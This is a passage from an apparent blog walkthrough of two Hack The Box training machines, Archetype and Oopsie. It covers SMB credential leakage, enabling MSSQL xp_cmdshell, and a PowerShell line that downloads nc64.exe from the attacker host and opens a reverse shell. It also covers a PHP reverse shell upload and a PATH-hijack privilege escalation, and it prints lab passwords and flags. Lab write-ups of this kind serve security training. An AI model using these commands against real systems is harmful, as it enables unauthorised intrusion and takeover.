</span></span><span class=line><span class=cl><span class=p>|</span>     Version: 
</span></span><span class=line><span class=cl><span class=p>|</span>       name: Microsoft SQL Server <span class=m>2017</span> RTM
</span></span><span class=line><span class=cl><span class=p>|</span>       number: 14.00.1000.00
</span></span><span class=line><span class=cl><span class=p>|</span>       Product: Microsoft SQL Server <span class=m>2017</span>
</span></span><span class=line><span class=cl><span class=p>|</span>       Service pack level: RTM
</span></span><span class=line><span class=cl><span class=p>|</span>       Post-SP patches applied: <span class=nb>false</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    TCP port: <span class=m>1433</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Wed Nov  2 14:28:26 2022 -- 1 IP address (1 host up) scanned in 22.75 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=smb>smb<a hidden class=anchor aria-hidden=true href=#smb>#</a></h3><p><code>smb</code> is open so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>smbclient -N -L 10.129.91.127
</span></span></code></pre></div><p><em>command tags:</em></p><ul><li><code>-N | --no-pass</code>: suppresses the normal password prompt from the client to the user.</li><li><code>-L | --list</code>: list available services on the server</li></ul><p>We can connect to the <code>backups</code> service without a password via:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>smbclient <span class=se>\\\\</span>10.129.91.127<span class=se>\\</span>backups
</span></span></code></pre></div><p>The only file housed here is <code>prod.dtsConfig</code>.</p><p><em>file: prod.dtsConfig</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>&lt;DTSConfiguration&gt;
</span></span><span class=line><span class=cl>    &lt;DTSConfigurationHeading&gt;
</span></span><span class=line><span class=cl>        &lt;DTSConfigurationFileInfo GeneratedBy=&#34;...&#34; GeneratedFromPackageName=&#34;...&#34; GeneratedFromPackageID=&#34;...&#34; GeneratedDate=&#34;20.1.2019 10:01:34&#34;/&gt;
</span></span><span class=line><span class=cl>    &lt;/DTSConfigurationHeading&gt;
</span></span><span class=line><span class=cl>    &lt;Configuration ConfiguredType=&#34;Property&#34; Path=&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34; ValueType=&#34;String&#34;&gt;
</span></span><span class=line><span class=cl>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
</span></span><span class=line><span class=cl>    &lt;/Configuration&gt;
</span></span><span class=line><span class=cl>&lt;/DTSConfiguration&gt;  
</span></span></code></pre></td></tr></table></div></div><p>Notably, this file leaks us</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
</span></span></code></pre></div><h3 id=sql>sql<a hidden class=anchor aria-hidden=true href=#sql>#</a></h3><p>Attempting to connect to sql database using <code>mysql</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>mysql -h 10.129.91.127 --port<span class=o>=</span><span class=m>1433</span> -u sql_svc -pM3g4c0rp123
</span></span></code></pre></div><p>After trying a couple variations of this, I realized that another tool maybe needed to connect to the <code>db</code>. <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server title="This link" target=_blank rel="nofollow noopener">This link</a> mentioned <code>mssqlclient.py</code>. I ran <code>locate mssqlclient.py</code> to search kali for the script.</p><p>Connect via:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127
</span></span></code></pre></div><p><figure class=image-caption><img alt=mssqlclient srcset="/posts/htb/startingpoint-tier2/images/mssqlclient_hu4795421139540986029.webp 480w,
/posts/htb/startingpoint-tier2/images/mssqlclient_hu10533429389953531608.webp 768w,
/posts/htb/startingpoint-tier2/images/mssqlclient_hu8283077622108935934.webp 1024w" sizes=100vw src=images/mssqlclient.png width=768 height=655 loading=lazy><figcaption></figcaption></figure></p><p>Then I used the <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server title="previous link" target=_blank rel="nofollow noopener">previous link</a> as well as this <a href=https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet title=cheatsheet target=_blank rel="nofollow noopener">cheatsheet</a> for <code>sql</code> commands. Generating command execution seems good:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps data-lang=ps><span class=line><span class=cl><span class=nf>EXEC</span> <span class=nf>xp_cmdshell</span> <span class=nf>&#39;net</span> <span class=nf>user&#39;;</span> <span class=nf>–</span> <span class=nf>privOn</span> <span class=nf>MSSQL</span> <span class=mf>2005</span> <span class=nf>you</span> <span class=nf>may</span> <span class=nf>need</span> <span class=nf>to</span> <span class=nf>reactivate</span> <span class=nf>xp_cmdshell</span> <span class=nf>first</span> <span class=nf>as</span> <span class=nf>it’s</span> <span class=nf>disabled</span> <span class=nf>by</span> <span class=nf>default:</span>
</span></span><span class=line><span class=cl><span class=nf>EXEC</span> <span class=nf>sp_configure</span> <span class=nf>&#39;show</span> <span class=nf>advanced</span> <span class=nf>options&#39;,</span> <span class=nf>1;</span> <span class=nf>–</span> <span class=nf>priv</span>
</span></span><span class=line><span class=cl><span class=nf>RECONFIGURE;</span> <span class=nf>–</span> <span class=nf>priv</span>
</span></span><span class=line><span class=cl><span class=nf>EXEC</span> <span class=nf>sp_configure</span> <span class=nf>&#39;xp_cmdshell&#39;,</span> <span class=nf>1;</span> <span class=nf>–</span> <span class=nf>priv</span>
</span></span><span class=line><span class=cl><span class=nf>RECONFIGURE;</span> <span class=nf>–</span> <span class=nf>priv</span>
</span></span></code></pre></div><p>And we have command execution:<figure class=image-caption><img alt=shell srcset="/posts/htb/startingpoint-tier2/images/shell_hu1478870567874155438.webp 480w,
/posts/htb/startingpoint-tier2/images/shell_hu11380430447569254039.webp 768w,
/posts/htb/startingpoint-tier2/images/shell_hu11449503515544532439.webp 1024w" sizes=100vw src=images/shell.png width=768 height=657 loading=lazy><figcaption></figcaption></figure></p><p>Then I tried several one-liner reverse shells for powershell, but didn&rsquo;t have any luck. So, I reverted back to the <code>netcat</code> binary (<a href=https://github.com/int0x33/nc.exe/blob/master/nc64.exe title=nc64.exe target=_blank rel="nofollow noopener">nc64.exe</a>) to spin up a reverse shell.</p><p>To host this file to the box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 -m http.server
</span></span></code></pre></div><p>Additionally, start <code>nc</code> locally for the reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>nc -lvnp <span class=m>1337</span>
</span></span></code></pre></div><p>Download the binary and run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps data-lang=ps><span class=line><span class=cl><span class=nf>xp_cmdshell</span> <span class=nf>&#34;powershell.exe</span> <span class=nf>cd</span> <span class=nf>c:\Users\Public;</span> <span class=nf>wget</span> <span class=nf>http:</span><span class=err>/</span><span class=nv>/10.10.14.232:8000/nc64.exe</span> <span class=nf>-outfile</span> <span class=nf>nc64.exe;</span> <span class=nf>.\nc64.exe</span> <span class=nf>-e</span> <span class=nf>cmd.exe</span> <span class=nf>10.10.14.232</span> <span class=nf>1337&#34;</span>
</span></span></code></pre></div><p><figure class=image-caption><img alt=rs srcset="/posts/htb/startingpoint-tier2/images/rs_hu11075392802448568344.webp 480w,
/posts/htb/startingpoint-tier2/images/rs_hu4268371005587087419.webp 768w,
/posts/htb/startingpoint-tier2/images/rs_hu11143628006537557070.webp 1024w" sizes=100vw src=images/rs.png width=768 height=656 loading=lazy><figcaption></figcaption></figure></p><p>After a bit of poking around, I found this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>    Directory: C:\Users\sql_svc\Desktop
</span></span><span class=line><span class=cl>                                                                                  
</span></span><span class=line><span class=cl>                                         
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name                             
</span></span><span class=line><span class=cl>                                      
</span></span><span class=line><span class=cl>----                -------------         ------ ----                             
</span></span><span class=line><span class=cl>                                      
</span></span><span class=line><span class=cl>-ar---        2/25/2020   6:37 AM             32 user.txt     
</span></span></code></pre></div><p><em>file: user.txt:</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>3e7b102e78218e935bf3f4951fec21a3
</span></span></code></pre></td></tr></table></div></div><h3 id=privesc>privesc<a hidden class=anchor aria-hidden=true href=#privesc>#</a></h3><p>Now we can look into becoming <code>root</code>. One great tool for automating this process is <a href=https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS title=winPEAS target=_blank rel="nofollow noopener"><code>winPEAS</code></a>. Just download it locally and then host it on a python server and download it in the reverse shell!</p><p>As I was scrolling through the output, a few things stood out:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>͹ Enumerating Security Packages Credentials                                       
</span></span><span class=line><span class=cl>  Version:NetNTLMv2                                               
</span></span><span class=line><span class=cl>  Hash: sql_svc::ARCHETYPE:1122334455667788:947576aa2fadb0cbbee6e345caee3fc6:0101000000000000ec105ee002efd8013a4c4936e65e1a2e0000000008003000300000000000000000000000003000004961ea35a68c9880c3eabe5d1edabb04866d05ca16c6fe9706906f3be985311d0a00100000000000000000000000000000000000090000000000000000000000 
</span></span></code></pre></div><p><figure class=image-caption><img alt=winpeas srcset="/posts/htb/startingpoint-tier2/images/winpeas_hu10915676845581648475.webp 480w,
/posts/htb/startingpoint-tier2/images/winpeas_hu12624083712845964141.webp 768w,
/posts/htb/startingpoint-tier2/images/winpeas_hu14099874177930580978.webp 1024w" sizes=100vw src=images/winpeas.png width=768 height=655 loading=lazy><figcaption></figcaption></figure></p><p>I decided to check the console history first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps data-lang=ps><span class=line><span class=cl><span class=nf>type</span> <span class=nf>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline</span><span class=nv>/ConsoleHost_history.txt</span>
</span></span></code></pre></div><p><em>file: ConsoleHost_history.txt</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
</span></span><span class=line><span class=cl>exit
</span></span></code></pre></td></tr></table></div></div><p>Now we can revert back to <code>impacket</code> tools and use <code>psexec.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n<span class=se>\!\!</span>@10.129.91.127
</span></span></code></pre></div><p><figure class=image-caption><img alt=root srcset="/posts/htb/startingpoint-tier2/images/root_hu4490647756406574178.webp 480w,
/posts/htb/startingpoint-tier2/images/root_hu8548109327704874927.webp 768w,
/posts/htb/startingpoint-tier2/images/root_hu6540498119777074087.webp 1024w" sizes=100vw src=images/root.png width=768 height=658 loading=lazy><figcaption></figcaption></figure></p><p>Finally, print out the flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\r</span>oot.txt
</span></span></code></pre></div><h3 id=questions>Questions<a hidden class=anchor aria-hidden=true href=#questions>#</a></h3><ul><li>Which TCP port is hosting a database server? <code>1433</code></li><li>What is the name of the non-Administrative share available over SMB? <code>backups</code></li><li>What is the password identified in the file on the SMB share? <code>M3g4c0rp123</code></li><li>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? <code>mssqlclient.py</code></li><li>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? <code>xp_cmdshell</code></li><li>What script can be used in order to search possible paths to escalate privileges on Windows hosts? <code>winPEAS</code></li><li>What file contains the administrator&rsquo;s password? <code>ConsoleHost_history.txt</code></li></ul><p><strong>user flag:</strong><code>3e7b102e78218e935bf3f4951fec21a3</code></p><p><strong>root flag:</strong><code>b91ccec3305e98240082d4474b848528</code></p><h2 id=oopsie>Oopsie<a hidden class=anchor aria-hidden=true href=#oopsie>#</a></h2><h3 id=nmap-1>nmap<a hidden class=anchor aria-hidden=true href=#nmap-1>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># Nmap 7.92 scan initiated Thu Nov  3 01:03:34 2022 as: nmap -sC -sV -oA nmap/oopsie -T4 10.129.28.128</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.28.128
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.071s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Thu Nov  3 01:03:44 2022 -- 1 IP address (1 host up) scanned in 10.62 seconds</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=http>http<a hidden class=anchor aria-hidden=true href=#http>#</a></h3><p>Start with <code>http</code>. Off the bat, I noticed that <code>megacorp.com</code> is likely their domain since <code>admin@megacorp.com</code> is a listed email. Other than that, the landing page seemed useless.</p><p>Time for <code>gobuster</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>sudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out -z
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 03<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 311<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/themes               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 315<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/themes/<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 312<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htm                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/uploads              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/uploads/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.                    <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 10932<span class=o>]</span>
</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 314<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/fonts/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.phtml               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htc                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html_var_DE         <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.html           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswds           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htm.                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htmll               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.phps                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.old            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.ht                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.bak            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htm.htm             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htgroup             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html1               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.LCK            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.printable      <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htm.LCK             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess.bak        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html.php            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htx                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htmls               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/cdn-cgi              <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 316<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.28.128/cdn-cgi/<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htlm                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htm2                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html-               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htuser              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 278<span class=o>]</span>
</span></span></code></pre></div><p><code>/cdn-cgi</code> seemed strange and stood out. After a quick search, we find this relates to <a href=https://developers.cloudflare.com/fundamentals/get-started/reference/cdn-cgi-endpoint/ title=Cloudflare target=_blank rel="nofollow noopener">Cloudflare</a>. Maybe there is a login page?</p><p><code>http://10.129.28.128/cdn-cgi/login/</code> works!</p><p>I tried some basic usernames and passwords, but no luck. Let&rsquo;s just login as a guest for now:</p><p><figure class=image-caption><img alt=guest srcset="/posts/htb/startingpoint-tier2/images/guest_hu17941897671117035169.webp 480w,
/posts/htb/startingpoint-tier2/images/guest_hu8999228013138728444.webp 768w,
/posts/htb/startingpoint-tier2/images/guest_hu11785045523576948987.webp 1024w" sizes=100vw src=images/guest.png width=768 height=677 loading=lazy><figcaption></figcaption></figure></p><p>Looks like the website is using <code>php</code>. Also, if we change the <code>id</code> in the url, we are able to change the <code>Account</code>, <code>Branding</code>, and <code>Clients</code> tab output. My first thought was to check the cookies to see if we can&rsquo;t edit something.</p><p><figure class=image-caption><img alt=upload srcset="/posts/htb/startingpoint-tier2/images/upload_hu6824953256549742948.webp 480w,
/posts/htb/startingpoint-tier2/images/upload_hu1673024969546994894.webp 768w,
/posts/htb/startingpoint-tier2/images/upload_hu6190036422794334882.webp 1024w" sizes=100vw src=images/upload.png width=768 height=680 loading=lazy><figcaption></figcaption></figure></p><p>Combining these ideas of the cookies and the <code>id</code>, I quickly unlocked the <code>Uploads</code> tab. I guess upload a <code>php</code> <a href=https://github.com/pentestmonkey/php-reverse-shell title="reverse shell" target=_blank rel="nofollow noopener">reverse shell</a>.</p><p>Now to find where this file was uploaded, and how to run it. <code>/uploads</code> seems like a plausible place to look (we saw this from our first scan).</p><p><figure class=image-caption><img alt=php-rs srcset="/posts/htb/startingpoint-tier2/images/php-rs_hu24377769492990208.webp 480w,
/posts/htb/startingpoint-tier2/images/php-rs_hu11292748847449580942.webp 768w,
/posts/htb/startingpoint-tier2/images/php-rs_hu1691201548981098724.webp 1024w" sizes=100vw src=images/php-rs.png width=768 height=680 loading=lazy><figcaption></figcaption></figure></p><p>Flag is found in <code>/home/robert/user.txt</code></p><p><em>file: user.txt</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>f2c74ee8db7983851ab2a96a44eb7981
</span></span></code></pre></td></tr></table></div></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>The above command gives us a functional shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm 
</span></span></code></pre></div><p>The above command lets us clear the screen.</p><p>After a bit of looking around, I found the <code>www</code> directories and went searching through that (<code>/var/www/html/cdn-cgi/login</code>). This lead to:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>index.php:if($_POST[&#34;username&#34;]===&#34;admin&#34; &amp;&amp; $_POST[&#34;password&#34;]===&#34;MEGACORP_4dm1n!!&#34;)
</span></span><span class=line><span class=cl>index.php:&lt;input type=&#34;password&#34; name=&#34;password&#34; placeholder=&#34;Password&#34; /&gt;
</span></span></code></pre></div><p><em>file: db.php</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$conn</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span><span class=s1>&#39;robert&#39;</span><span class=p>,</span><span class=s1>&#39;M3g4C0rpUs3r!&#39;</span><span class=p>,</span><span class=s1>&#39;garage&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>We can now go from <code>www-data</code> to <code>robert</code> via <code>su robert</code> and put in his password <code>M3g4C0rpUs3r!</code></p><h3 id=privesc-1>privesc<a hidden class=anchor aria-hidden=true href=#privesc-1>#</a></h3><p>Time for <a href=https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md title=linpeas target=_blank rel="nofollow noopener"><code>linpeas</code></a>. I simply downloaded the <code>.sh</code> file locally, hosted it on a python server, and then downloaded it on the reverse shell.</p><p>On the first look through, the <code>bugtracker</code> group stood out – especially since there is an unknown <code>SUID</code> (Set owner User ID) binary called <code>/usr/bin/bugtracker</code>.</p><p><figure class=image-caption><img alt=linpeas srcset="/posts/htb/startingpoint-tier2/images/linpeas_hu8887544867851610175.webp 480w,
/posts/htb/startingpoint-tier2/images/linpeas_hu2272481245014498461.webp 768w,
/posts/htb/startingpoint-tier2/images/linpeas_hu18358338898159088519.webp 1024w" sizes=100vw src=images/linpeas.png width=768 height=586 loading=lazy><figcaption></figcaption></figure></p><p><code>ltrace</code> is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ltrace /usr/bin/bugtracker
</span></span></code></pre></div><p>The above command gives us the output:</p><p><figure class=image-caption><img alt=ltrace srcset="/posts/htb/startingpoint-tier2/images/ltrace_hu3014492999926919983.webp 480w,
/posts/htb/startingpoint-tier2/images/ltrace_hu10286566447890815989.webp 768w,
/posts/htb/startingpoint-tier2/images/ltrace_hu18314172989511837875.webp 1024w" sizes=100vw src=images/ltrace.png width=768 height=588 loading=lazy><figcaption></figcaption></figure></p><p>Since <code>system("cat...")</code> is being run, we can simply update the <code>$path</code> environment variable to point to point to our own malicious <code>cat</code> such as a <code>/bin/sh</code> shell that will keep the admin privileges. Like so:</p><p><figure class=image-caption><img alt=oopsie srcset="/posts/htb/startingpoint-tier2/images/oopsie_hu3128237290382431787.webp 480w,
/posts/htb/startingpoint-tier2/images/oopsie_hu3893136910139700358.webp 768w,
